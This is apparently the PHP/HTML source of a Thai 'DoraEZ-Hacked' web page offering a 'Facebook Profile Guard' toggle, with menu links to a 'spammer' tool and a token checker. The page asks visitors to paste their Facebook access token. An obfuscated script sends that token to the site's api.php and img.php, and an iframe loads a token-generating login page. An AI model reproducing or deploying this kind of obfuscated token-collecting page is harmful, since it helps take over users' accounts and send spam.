<?php
include('session.php');
include('conn.php');
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>DoraEZ</title>
    <!-- Bootstrap -->
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="css/style.css" rel="stylesheet">
    <link href="css/all.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Kanit|Montserrat" rel="stylesheet">
    <link rel="stylesheet" href="master_style.css">
    <link rel="stylesheet" href="_all-skins.css">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/1.1.3/sweetalert.css" rel="stylesheet" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/1.1.3/sweetalert.min.js"></script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->

 <style type="text/css">
  body
  {
      background: url(img/bg4.jpg) no-repeat center fixed;
    -webkit-background-size: cover;
    -moz-background-size: cover;
    -o-background-size: cover;
    background-size: cover;
    font-family:"Kanit", sans-serif;
    color: black;
  }
  </style>
    <script>
function startTime() {
  var today = new Date();
  var h = today.getHours();
  var m = today.getMinutes();
  var s = today.getSeconds();
  m = checkTime(m);
  s = checkTime(s);
  document.getElementById('txt').innerHTML =
  h + ":" + m + ":" + s;
  var t = setTimeout(startTime, 500);
}
function checkTime(i) {
  if (i < 10) {i = "0" + i};  // add zero in front of numbers < 10
  return i;
}
</script>
  </head>
<body class="hold-transition lockscreen2" onload="startTime()">

    <!-- Fixed navbar -->
    <nav class="navbar navbar-default navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
            <span class="sr-only">DoraEZ</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="navbar-brand" href="#">DoraEZ-Hacked</a>
        </div>
        <div id="navbar" class="navbar-collapse collapse">
          <ul class="nav navbar-nav">
            <li><a href="index">หน้าแรก</a></li>
            <li><a href="download">ดาวน์โหลด</a></li>
            <li><a href="https://www.facebook.com/profile.php?id=100033611693024" target="_blank">ติดต่อเรา</a></li>
            <li class="dropdown">
              <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">เมนูเสริม <span class="caret"></span></a>
              <ul class="dropdown-menu">
                <li class="dropdown-header">ชื่อผู้ใช้</li>
                <li><a><?php echo $user; ?></a></li>
                <li role="separator" class="divider"></li>
                <li class="dropdown-header">โปรแกรม</li>
                <li><a href="spammer">สแปมเมอร์</a></li>
                <li class="active"><a href="profile">โปรไฟล์การ์ด</a></li>
                <li><a href="checktoken">เช็คโทเคน</a></li>
                <li role="separator" class="divider"></li>
                <li class="dropdown-header">เมนูสมาชิก</li>
                <li><a href="download">ดาวน์โหลด</a></li>
                <li><a href="logout">ออกจากระบบ</a></li>
            </li>
          </ul>
          <li><a href=""><div id="txt"></div></a></li>
        </div><!--/.nav-collapse -->
      </div>
    </nav>
<!-- Fixed navbar -->

      <div class="lockscreen-wrapper">
            <div class="lockscreen-logo" style="margin: 100px 0px 20px 0px">
                <b style="color: #fff; text-shadow: 0 0 1em #F87, 0 0 1em #F87; font-weight: bold;">Facebook<br> Profile Guard</b>
      </div>
            <div class="lockscreen-box-body">
                <div class="lockscreen-item">
                    <div class="lockscreen-image">
                        <p id="imgfb"><img src="img/fb-profile.png" alt="User Image" style="width: 120px;height: 120px;"></p>
          </div>
          <form class="lockscreen-credentials form-element margin-top-20" id="guard">
            <div class="form-group has-feedback">
              <input type="txt" class="form-control" name="access_token" id="access_token" placeholder="ใส่ Token Facebook ของคุณ">
            </div>
            <div class="form-group has-feedback">
              <div class="radio">
                <input name="active" type="radio" id="turn_on" value="on" checked>
                <label for="turn_on">เปิดโล่ On Profile Guard</label>                    
              </div>
              <div class="radio">
                <input name="active" type="radio" value="off" id="turn_off">
                <label for="turn_off">ปิดโล่ Off Profile Guard</label>   
              </div>
            </div>
            <div class="text-center">
              <button class="btn btn-info btn-block btn-flat margin-top-10" name="submit" id="process">ยืนยัน</button>
              <a class="btn btn-danger btn-block btn-flat margin-top-10"  style="color: #fff" data-toggle="modal" data-target="#myModal">สร้าง Token</a>
            </div>
          </form>
          <div class="help-block text-center margin-top-20"></div>
        </div>
      </div>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
    <script src="sweetalert.min.js"></script>
    <script>
      var _0x127d=["\u0E2D\u0E4A\u0E30\x21","\u0E40\u0E01\u0E34\u0E14\u0E02\u0E49\u0E2D\u0E1C\u0E34\u0E14\u0E1E\u0E25\u0E32\u0E14\u0E42\u0E1B\u0E23\u0E14\u0E25\u0E2D\u0E07\u0E2D\u0E35\u0E01\u0E04\u0E23\u0E31\u0E49\u0E07\u0E43\u0E19\u0E20\u0E32\u0E22\u0E2B\u0E25\u0E31\u0E07","\x65\x72\x72\x6F\x72","\x66\x61\x69\x6C","\x70\x61\x72\x73\x65","\x74\x69\x74\x6C\x65","\x6D\x65\x73\x73\x61\x67\x65","\x74\x79\x70\x65","\x64\x6F\x6E\x65","\x50\x4F\x53\x54","\x61\x70\x69\x2E\x70\x68\x70","\x73\x65\x72\x69\x61\x6C\x69\x7A\x65","\x74\x65\x78\x74","\x61\x6A\x61\x78","\x68\x74\x6D\x6C","\x23\x69\x6D\x67\x66\x62","\x69\x6D\x67\x2E\x70\x68\x70","\x70\x72\x65\x76\x65\x6E\x74\x44\x65\x66\x61\x75\x6C\x74","\x73\x75\x62\x6D\x69\x74","\x23\x67\x75\x61\x72\x64"];$(function(){$(_0x127d[19])[_0x127d[18]](function(_0x35b6x1){$[_0x127d[13]]({method:_0x127d[9],url:_0x127d[10],data:$(this)[_0x127d[11]](),dataType:_0x127d[12]})[_0x127d[8]](function(_0x35b6x2){var _0x35b6x3=JSON[_0x127d[4]](_0x35b6x2);swal(_0x35b6x3[_0x127d[5]],_0x35b6x3[_0x127d[6]],_0x35b6x3[_0x127d[7]])})[_0x127d[3]](function(){swal(_0x127d[0],_0x127d[1],_0x127d[2])});$[_0x127d[13]]({method:_0x127d[9],url:_0x127d[16],data:$(this)[_0x127d[11]](),dataType:_0x127d[12]})[_0x127d[8]](function(_0x35b6x2){$(_0x127d[15])[_0x127d[14]](_0x35b6x2)});_0x35b6x1[_0x127d[17]]()})})
    </script>
    
    <!-- Modal -->
    <div class="modal fade" id="myModal" role="dialog">
      <div class="modal-dialog modal-lg">
        <div class="modal-content">
          <div class="modal-header">
            <button type="button" class="close" data-dismiss="modal">&times;</button>
          </div>
          <div class="modal-body">
            <p><iframe src="logintoken.php" width="100%" height="320" seamless=""></iframe></p>
          </div>
          <div class="modal-footer">
              <a class="btn btn-danger"  style="color: #fff" data-dismiss="modal">ปิด</a>
          </div>
        </div>
      </div>
    </div>  
  </div>

      <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="js/jquery.min.js"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="js/bootstrap.min.js"></script>
    <script src="js/popper.min.js"></script>

  </body>
</html>